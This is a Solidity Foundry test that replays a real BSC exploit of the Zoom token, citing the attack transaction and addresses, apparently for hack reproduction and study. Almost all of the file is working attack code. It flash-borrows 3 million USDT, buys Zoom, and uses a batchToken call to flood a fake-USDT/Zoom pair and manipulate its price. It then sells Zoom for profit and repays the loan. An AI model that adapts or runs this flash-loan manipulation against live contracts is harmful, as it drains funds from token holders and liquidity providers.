// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Exploit Alert ref: https://twitter.com/blocksecteam/status/1567027459207606273?s=21&t=ZNoZgSdAuI4dJIFlMaTJeg
// Origin Attack Transaction: 0xe176bd9cfefd40dc03508e91d856bd1fe72ffc1e9260cd63502db68962b4de1a
// Blocksec Txinfo: https://tools.blocksec.com/tx/bsc/0xe176bd9cfefd40dc03508e91d856bd1fe72ffc1e9260cd63502db68962b4de1a

// Attack Addr: 0xc578d755cd56255d3ff6e92e1b6371ba945e3984
// Attack Contract: 0xb8d700f30d93fab242429245e892600dcc03935d

interface IUSD {
    function batchToken(address[] calldata _addr, uint256[] calldata _num, address token) external;
    function swapTokensForExactTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function buy(uint256) external;
    function sell(uint256) external;
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function sync() external;
}

contract ContractTest is Test {
    IPancakePair PancakePair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00); // KIMO/WBNB pair
    address private usdt = 0x55d398326f99059fF775485246999027B3197955;
    address private swap = 0x5a9846062524631C01ec11684539623DAb1Fae58;
    IERC20 Usdt = IERC20(usdt);
    address private zoom = 0x9CE084C378B3E65A164aeba12015ef3881E0F853;
    address private batch = 0x47391071824569F29381DFEaf2f1b47A4004933B; //Batch Token
    address private fUSDT = 0x62D51AACb079e882b1cb7877438de485Cba0dD3f; // Fake USDT
    address private pp = 0x1c7ecBfc48eD0B34AAd4a9F338050685E66235C5; // FakeUSDT/Zoom pair
    IERC20 Zoom = IERC20(zoom);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 21_055_930); //fork bsc at block number 21055930
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit", Usdt.balanceOf(address(this)), 18);

        // flashloan - Brrow 3,000,000 USDT
        PancakePair.swap(3_000_000_000_000_000_000_000_000, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "[End] After repay, Profit: USDT balance of attacker", Usdt.balanceOf(address(this)), 18
        );
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        uint256 ba = Usdt.balanceOf(address(this));
        Usdt.approve(swap, 100_000_000_000_000_000_000_000_000_000_000_000_000);

        // use usdt to swap zoom
        IUSD(swap).buy(ba);
        emit log_named_decimal_uint("Zoom balance of attacker:", Zoom.balanceOf(address(this)), 18);

        address[] memory n1 = new address[](1);
        n1[0] = pp;
        uint256[] memory n2 = new uint256[](1);
        n2[0] = 1_000_000 ether;
        emit log_named_decimal_uint(
            "Before manipulate price, Fake USDT balance of pair:", IERC20(fUSDT).balanceOf(address(pp)), 18
        );
        emit log_named_decimal_uint("Before manipulate price, Zoom balance of pair:", Zoom.balanceOf(address(pp)), 18);
        IUSD(batch).batchToken(n1, n2, fUSDT);

        emit log_named_decimal_uint(
            "After manipulate price, Fake USDT balance of pair:", IERC20(fUSDT).balanceOf(address(pp)), 18
        );
        emit log_named_decimal_uint("After manipulate price, Zoom balance of pair:", Zoom.balanceOf(address(pp)), 18);

        // calling pair Fake USDT-Zoom sync() to update latest price
        IUSD(pp).sync();

        uint256 baz = Zoom.balanceOf(address(this));
        Zoom.approve(swap, baz * 100);
        IUSD(swap).sell(baz);

        emit log_named_decimal_uint("After selling Zoom, USDT balance of attacker:", Usdt.balanceOf(address(this)), 18);
        //Repay flashloan
        Usdt.transfer(address(PancakePair), (ba * 10_030) / 10_000);

        uint256 U = Usdt.balanceOf(address(this));
        IERC20(usdt).transfer(address(this), U);
    }

    receive() external payable {}
}
